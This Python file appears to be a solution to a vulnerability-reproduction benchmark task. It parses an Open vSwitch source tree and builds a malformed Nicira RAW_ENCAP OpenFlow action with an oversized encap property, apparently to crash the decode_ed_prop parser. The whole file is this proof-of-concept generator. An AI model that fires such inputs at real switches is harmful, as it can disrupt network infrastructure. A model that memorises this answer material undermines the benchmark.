import os
import re
import tarfile
import tempfile
import shutil
import ast
import struct
from typing import Dict, Optional, Tuple, List


def _read_text(path: str, max_bytes: int = 8_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            data = data[:max_bytes]
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    lines = []
    for line in s.splitlines():
        if "//" in line:
            line = line.split("//", 1)[0]
        lines.append(line)
    return "\n".join(lines)


def _safe_int_eval(expr: str, names: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = expr.rstrip(",")
    expr = re.sub(r"\bULL\b|\bLL\b|\bU\b|\bL\b", "", expr)
    expr = expr.replace("(", " ( ").replace(")", " ) ")
    expr = " ".join(expr.split())
    try:
        node = ast.parse(expr, mode="eval")
    except Exception:
        return None

    allowed_binops = (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Div, ast.Mod, ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor)
    allowed_unops = (ast.UAdd, ast.USub, ast.Invert)

    def _eval(n):
        if isinstance(n, ast.Expression):
            return _eval(n.body)
        if isinstance(n, ast.Constant):
            if isinstance(n.value, int):
                return int(n.value)
            return None
        if isinstance(n, ast.Num):
            return int(n.n)
        if isinstance(n, ast.Name):
            return int(names.get(n.id))
        if isinstance(n, ast.UnaryOp) and isinstance(n.op, allowed_unops):
            v = _eval(n.operand)
            if v is None:
                return None
            if isinstance(n.op, ast.UAdd):
                return +v
            if isinstance(n.op, ast.USub):
                return -v
            if isinstance(n.op, ast.Invert):
                return ~v
            return None
        if isinstance(n, ast.BinOp) and isinstance(n.op, allowed_binops):
            l = _eval(n.left)
            r = _eval(n.right)
            if l is None or r is None:
                return None
            if isinstance(n.op, ast.Add):
                return l + r
            if isinstance(n.op, ast.Sub):
                return l - r
            if isinstance(n.op, ast.Mult):
                return l * r
            if isinstance(n.op, (ast.Div, ast.FloorDiv)):
                if r == 0:
                    return None
                return l // r
            if isinstance(n.op, ast.Mod):
                if r == 0:
                    return None
                return l % r
            if isinstance(n.op, ast.LShift):
                return l << r
            if isinstance(n.op, ast.RShift):
                return l >> r
            if isinstance(n.op, ast.BitOr):
                return l | r
            if isinstance(n.op, ast.BitAnd):
                return l & r
            if isinstance(n.op, ast.BitXor):
                return l ^ r
            return None
        if isinstance(n, ast.ParenExpr):  # py>=3.12 maybe
            return _eval(n.expression)
        return None

    try:
        v = _eval(node)
        if v is None:
            return None
        return int(v) & 0xFFFFFFFFFFFFFFFF
    except Exception:
        return None


def _collect_defines_and_enums(text: str) -> Dict[str, int]:
    text = _strip_c_comments(text)
    consts: Dict[str, int] = {}

    for m in re.finditer(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$", text, flags=re.M):
        name, rhs = m.group(1), m.group(2).strip()
        if rhs.startswith('"') or rhs.startswith("'"):
            continue
        rhs = rhs.split("\\")[0].strip()
        rhs = rhs.strip()
        rhs = re.sub(r"\b\w+\s*\(([^()]*)\)", r"\1", rhs)  # drop simple macro wrappers like htonl(x)
        rhs = rhs.split("/*", 1)[0].split("//", 1)[0].strip()
        v = _safe_int_eval(rhs, consts)
        if v is not None:
            consts[name] = v

    # enums
    idx = 0
    n = len(text)
    while True:
        m = re.search(r"\benum\b", text[idx:])
        if not m:
            break
        start = idx + m.start()
        brace = text.find("{", start)
        if brace < 0:
            idx = start + 4
            continue
        # match braces
        depth = 0
        end = None
        for i in range(brace, n):
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i
                    break
        if end is None:
            break
        body = text[brace + 1:end]
        parts = [p.strip() for p in body.split(",")]
        cur = 0
        have_cur = False
        for p in parts:
            if not p:
                continue
            if "=" in p:
                nm, ex = p.split("=", 1)
                nm = nm.strip()
                ex = ex.strip()
                v = _safe_int_eval(ex, consts)
                if v is None:
                    # attempt parse literal
                    lit = re.match(r"^(0x[0-9a-fA-F]+|\d+)$", ex)
                    if lit:
                        v = int(lit.group(1), 0)
                if v is None:
                    continue
                consts[nm] = int(v)
                cur = int(v) + 1
                have_cur = True
            else:
                nm = p.strip()
                if not nm:
                    continue
                if have_cur:
                    consts[nm] = cur
                    cur += 1
                else:
                    consts[nm] = 0
                    cur = 1
                    have_cur = True
        idx = end + 1

    return consts


def _find_file(root: str, basename: str) -> Optional[str]:
    for dp, _, fns in os.walk(root):
        for fn in fns:
            if fn == basename:
                return os.path.join(dp, fn)
    return None


def _find_files_containing(root: str, needle: str, exts: Tuple[str, ...] = (".c", ".h")) -> List[str]:
    hits = []
    for dp, _, fns in os.walk(root):
        for fn in fns:
            if not fn.endswith(exts):
                continue
            path = os.path.join(dp, fn)
            try:
                st = os.stat(path)
                if st.st_size > 8_000_000:
                    continue
            except Exception:
                continue
            txt = _read_text(path, max_bytes=2_000_000)
            if needle in txt:
                hits.append(path)
    return hits


def _extract_function(text: str, func_name: str) -> Optional[str]:
    text_nc = _strip_c_comments(text)
    m = re.search(r"\b%s\s*\(" % re.escape(func_name), text_nc)
    if not m:
        return None
    start = m.start()
    brace = text_nc.find("{", m.end())
    if brace < 0:
        return None
    depth = 0
    for i in range(brace, len(text_nc)):
        if text_nc[i] == "{":
            depth += 1
        elif text_nc[i] == "}":
            depth -= 1
            if depth == 0:
                return text_nc[brace:i + 1]
    return None


def _extract_struct_block(text: str, struct_name: str) -> Optional[str]:
    text_nc = _strip_c_comments(text)
    m = re.search(r"\bstruct\s+%s\s*\{" % re.escape(struct_name), text_nc)
    if not m:
        return None
    brace = text_nc.find("{", m.end() - 1)
    if brace < 0:
        return None
    depth = 0
    for i in range(brace, len(text_nc)):
        if text_nc[i] == "{":
            depth += 1
        elif text_nc[i] == "}":
            depth -= 1
            if depth == 0:
                return text_nc[m.start():i + 1]
    return None


_SIZE_MAP = {
    "uint8_t": 1, "int8_t": 1, "char": 1, "unsigned char": 1, "signed char": 1,
    "uint16_t": 2, "int16_t": 2, "ovs_be16": 2, "ovs_le16": 2,
    "uint32_t": 4, "int32_t": 4, "ovs_be32": 4, "ovs_le32": 4,
    "uint64_t": 8, "int64_t": 8, "ovs_be64": 8, "ovs_le64": 8,
}


def _normalize_type(t: str) -> str:
    t = t.strip()
    t = re.sub(r"\bconst\b|\bvolatile\b|\bOVS_PACKED\b|\bOVS_ALIGNED\s*\([^)]*\)", "", t)
    t = re.sub(r"\s+", " ", t).strip()
    return t


def _parse_struct_fields(struct_block: str) -> List[Tuple[str, str, int, int]]:
    """
    Returns list of (name, type, offset, size) assuming packed layout.
    """
    if not struct_block:
        return []
    body_m = re.search(r"\{(.*)\}\s*$", struct_block, flags=re.S)
    if not body_m:
        return []
    body = body_m.group(1)
    body = _strip_c_comments(body)
    # Remove preprocessor lines
    body = "\n".join([ln for ln in body.splitlines() if not ln.lstrip().startswith("#")])
    stmts = []
    cur = ""
    depth = 0
    for ch in body:
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
        if ch == ";" and depth == 0:
            stmts.append(cur + ";")
            cur = ""
        else:
            cur += ch
    fields = []
    offset = 0
    for st in stmts:
        st = st.strip()
        if not st or st == ";":
            continue
        if "typedef" in st:
            continue
        if "union" in st or "struct" in st and "{" in st:
            continue
        if ":" in st:
            continue
        if "*" in st:
            continue
        st = st.rstrip(";").strip()
        st = re.sub(r"\bOVS_ALIGNED\s*\([^)]*\)", "", st)
        st = re.sub(r"\bOVS_PACKED\b", "", st)
        st = st.strip()
        if not st:
            continue

        # handle multiple declarators "uint8_t a, b[2]"
        # split by commas at top-level
        decls = []
        buf = ""
        bracket = 0
        for c in st:
            if c == "[":
                bracket += 1
            elif c == "]":
                bracket -= 1
            if c == "," and bracket == 0:
                decls.append(buf.strip())
                buf = ""
            else:
                buf += c
        if buf.strip():
            decls.append(buf.strip())

        # first decl includes type; subsequent reuse same type
        if not decls:
            continue
        first = decls[0]
        m = re.match(r"^(?P<type>(?:struct\s+\w+|\w+(?:\s+\w+)*))\s+(?P<name>\w+)(?P<array>\[[^\]]*\])?$", first)
        if not m:
            continue
        base_type = _normalize_type(m.group("type"))
        decs = [(m.group("name"), m.group("array") or "")]
        for other in decls[1:]:
            m2 = re.match(r"^(?P<name>\w+)(?P<array>\[[^\]]*\])?$", other)
            if not m2:
                continue
            decs.append((m2.group("name"), m2.group("array") or ""))

        for name, arr in decs:
            arr = arr.strip()
            count = 1
            if arr:
                inner = arr[1:-1].strip()
                if inner == "" or inner == "0":
                    count = 0
                else:
                    try:
                        count = int(inner, 0)
                    except Exception:
                        count = 0
            size = 0
            if base_type.startswith("struct "):
                # size resolved externally
                size = -1
            else:
                size = _SIZE_MAP.get(base_type, 0)
            if size == 0 and base_type.startswith("uint8_t"):
                size = 1
            if size == -1:
                size = -1
            elif count == 0:
                size = 0
            else:
                size *= count
            fields.append((name, base_type, offset, size))
            offset += max(0, size)
    return fields


class _StructCache:
    def __init__(self, root: str):
        self.root = root
        self.cache: Dict[str, Tuple[int, List[Tuple[str, str, int, int]]]] = {}

    def struct_size_and_fields(self, name: str) -> Tuple[int, List[Tuple[str, str, int, int]]]:
        if name in self.cache:
            return self.cache[name]
        # find struct definition
        candidates = _find_files_containing(self.root, f"struct {name}", exts=(".h", ".c"))
        block = None
        for path in candidates[:20]:
            txt = _read_text(path, max_bytes=4_000_000)
            blk = _extract_struct_block(txt, name)
            if blk:
                block = blk
                break
        if not block:
            self.cache[name] = (0, [])
            return 0, []
        fields = _parse_struct_fields(block)
        # resolve nested struct sizes
        size = 0
        resolved_fields = []
        for fname, ftype, off, fsz in fields:
            if fsz == -1 and ftype.startswith("struct "):
                sub = ftype.split(" ", 1)[1].strip()
                sub_sz, _ = self.struct_size_and_fields(sub)
                fsz = sub_sz
            resolved_fields.append((fname, ftype, off, fsz))
            size = max(size, off + max(0, fsz))
        self.cache[name] = (size, resolved_fields)
        return size, resolved_fields


def _round_up(x: int, a: int) -> int:
    return (x + (a - 1)) & ~(a - 1)


def _choose_ed_prop_case(ofp_actions_text: str) -> Optional[str]:
    fbody = _extract_function(ofp_actions_text, "decode_ed_prop")
    if not fbody:
        return None
    # collect cases
    cases = []
    for m in re.finditer(r"\bcase\s+([A-Za-z_]\w*)\s*:", fbody):
        nm = m.group(1)
        if "ED_PROP" in nm:
            cases.append((m.start(), nm))
    if not cases:
        return None
    cases.sort()
    # Build snippets for ranking
    best = None
    best_score = -10**9
    for i, (pos, nm) in enumerate(cases):
        end = cases[i + 1][0] if i + 1 < len(cases) else len(fbody)
        snippet = fbody[pos:end]
        sn = snippet.lower()
        score = 0
        if any(k in nm for k in ("RAW", "HEADER", "BYTES", "DATA")):
            score += 100
        if "len -" in sn or "len-" in sn or "payload" in sn:
            score += 30
        if "len !=" in sn:
            score -= 10
        if "bad_len" in sn or "OFPBAC_BAD_LEN".lower() in sn:
            score -= 5
        if "return" in sn and "bad" in sn:
            score -= 2
        # prefer shorter/likely simple cases
        score -= min(50, len(snippet) // 200)
        if score > best_score:
            best_score = score
            best = nm
    return best


def _choose_ed_prop_type_value(constants: Dict[str, int], preferred_names: List[str]) -> Optional[Tuple[str, int]]:
    for nm in preferred_names:
        if nm in constants:
            return nm, constants[nm]
    # fallback: any NX_ED_PROP_* constant
    eds = [(k, v) for k, v in constants.items() if k.startswith("NX_ED_PROP_")]
    if not eds:
        return None
    eds.sort(key=lambda kv: kv[1])
    return eds[0][0], eds[0][1]


def _pack_be_u(value: int, size: int) -> bytes:
    if size == 1:
        return struct.pack("!B", value & 0xFF)
    if size == 2:
        return struct.pack("!H", value & 0xFFFF)
    if size == 4:
        return struct.pack("!I", value & 0xFFFFFFFF)
    if size == 8:
        return struct.pack("!Q", value & 0xFFFFFFFFFFFFFFFF)
    return bytes([0] * size)


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        root = src_path
        try:
            if os.path.isdir(src_path):
                root = src_path
            else:
                tmpdir = tempfile.mkdtemp(prefix="arvo_ovs_")
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
                entries = [os.path.join(tmpdir, e) for e in os.listdir(tmpdir)]
                dirs = [e for e in entries if os.path.isdir(e)]
                root = dirs[0] if len(dirs) == 1 else tmpdir

            nicira = _find_file(root, "nicira-ext.h")
            ofp_actions_c = _find_file(root, "ofp-actions.c")
            if not ofp_actions_c:
                # alternate locations
                hits = _find_files_containing(root, "decode_NXAST_RAW_ENCAP", exts=(".c",))
                ofp_actions_c = hits[0] if hits else None

            consts: Dict[str, int] = {}
            if nicira:
                consts.update(_collect_defines_and_enums(_read_text(nicira)))
            if ofp_actions_c:
                consts.update(_collect_defines_and_enums(_read_text(ofp_actions_c)))

            nx_vendor_id = consts.get("NX_VENDOR_ID", 0x00002320)
            nxast_raw_encap = consts.get("NXAST_RAW_ENCAP")
            if nxast_raw_encap is None:
                # attempt to find any constant containing RAW_ENCAP
                for k, v in consts.items():
                    if k.endswith("RAW_ENCAP") and isinstance(v, int):
                        nxast_raw_encap = v
                        break
            if nxast_raw_encap is None:
                nxast_raw_encap = 0

            # Determine action struct size and field offsets (best effort)
            sc = _StructCache(root)
            action_struct_size = 0
            action_fields: List[Tuple[str, str, int, int]] = []
            if nicira:
                nicira_txt = _read_text(nicira)
                blk = _extract_struct_block(nicira_txt, "nx_action_raw_encap")
                if blk:
                    action_fields = _parse_struct_fields(blk)
                    # resolve nested sizes
                    size = 0
                    resolved = []
                    for fname, ftype, off, fsz in action_fields:
                        if fsz == -1 and ftype.startswith("struct "):
                            sub = ftype.split(" ", 1)[1].strip()
                            sub_sz, _ = sc.struct_size_and_fields(sub)
                            fsz = sub_sz
                        resolved.append((fname, ftype, off, fsz))
                        size = max(size, off + max(0, fsz))
                    action_fields = resolved
                    action_struct_size = size
            if action_struct_size <= 0:
                # common wire header for NX actions: 16
                # RAW_ENCAP likely adds at least 4 bytes packet_type and 4 pad => 24
                action_struct_size = 24

            # Determine a good ED prop type from decode_ed_prop
            preferred_case = None
            if ofp_actions_c:
                preferred_case = _choose_ed_prop_case(_read_text(ofp_actions_c))

            preferred_names = []
            if preferred_case and preferred_case.startswith("NX_ED_PROP_"):
                preferred_names.append(preferred_case)
            # Add some likely names
            preferred_names += [
                "NX_ED_PROP_RAW",
                "NX_ED_PROP_HEADER",
                "NX_ED_PROP_BYTES",
                "NX_ED_PROP_DATA",
                "NX_ED_PROP_ETHERNET",
            ]
            ed_choice = _choose_ed_prop_type_value(consts, preferred_names)
            if ed_choice:
                ed_prop_name, ed_prop_type = ed_choice
            else:
                ed_prop_name, ed_prop_type = ("NX_ED_PROP_UNKNOWN", 0)

            # Construct action: target length 72 (multiple of 8), but ensure >= struct + 8
            target_action_len = 72
            if target_action_len < action_struct_size + 8:
                target_action_len = _round_up(action_struct_size + 8, 8)
            if target_action_len % 8 != 0:
                target_action_len = _round_up(target_action_len, 8)

            # Properties bytes to fill
            props_total = target_action_len - action_struct_size
            if props_total < 8:
                props_total = 8
                target_action_len = _round_up(action_struct_size + props_total, 8)

            # Try single property with length == props_total
            # Property header is 4 bytes: type,len, with len including header.
            # Many OVS properties require len multiple of 8; ensure.
            prop_len = props_total
            if prop_len % 8 != 0:
                prop_len = _round_up(prop_len, 8)
                target_action_len = _round_up(action_struct_size + prop_len, 8)
                props_total = target_action_len - action_struct_size
                prop_len = props_total

            # Build property
            prop = bytearray()
            prop += struct.pack("!HH", ed_prop_type & 0xFFFF, prop_len & 0xFFFF)
            prop += b"\x00" * (prop_len - 4)
            props = bytes(prop)

            # Build base action struct bytes
            base = bytearray(b"\x00" * action_struct_size)

            # Standard NX header: type(2), len(2), vendor(4), subtype(2), pad(6)
            # If struct is smaller than 16 (unlikely), extend.
            if len(base) < 16:
                base.extend(b"\x00" * (16 - len(base)))
                action_struct_size = len(base)

            base[0:2] = struct.pack("!H", 0xFFFF)  # OFPAT_EXPERIMENTER / OFPAT_VENDOR
            base[2:4] = struct.pack("!H", target_action_len & 0xFFFF)
            base[4:8] = struct.pack("!I", nx_vendor_id & 0xFFFFFFFF)
            base[8:10] = struct.pack("!H", nxast_raw_encap & 0xFFFF)

            # Attempt to set packet_type / new_packet_type fields if present
            # Use Ethernet ethertype namespace 0, type 0x0800 (IPv4) => 0x00000800
            pkt_type32 = 0x00000800
            n_props = 1

            # If we're forced to use multiple properties (not currently), we'd adjust n_props.
            total_props_len = len(props)

            for fname, ftype, off, fsz in action_fields:
                if fsz <= 0:
                    continue
                fn = fname.lower()
                if "packet_type" in fn:
                    if fsz == 4:
                        base[off:off + 4] = struct.pack("!I", pkt_type32)
                    elif fsz == 2:
                        base[off:off + 2] = struct.pack("!H", 0x0800)
                elif fn in ("n_props", "n_properties", "nprops", "nproperties"):
                    if fsz == 2:
                        base[off:off + 2] = struct.pack("!H", n_props & 0xFFFF)
                    elif fsz == 4:
                        base[off:off + 4] = struct.pack("!I", n_props & 0xFFFFFFFF)
                elif "props_len" in fn or "properties_len" in fn or fn == "len" and off >= 16:
                    # avoid clobbering header len at offset 2
                    if fsz == 2:
                        base[off:off + 2] = struct.pack("!H", total_props_len & 0xFFFF)
                    elif fsz == 4:
                        base[off:off + 4] = struct.pack("!I", total_props_len & 0xFFFFFFFF)

            poc = bytes(base) + props
            # Ensure final size matches encoded length (as much as possible)
            if len(poc) != target_action_len:
                if len(poc) < target_action_len:
                    poc += b"\x00" * (target_action_len - len(poc))
                else:
                    poc = poc[:target_action_len]
            return poc
        finally:
            if tmpdir:
                shutil.rmtree(tmpdir, ignore_errors=True)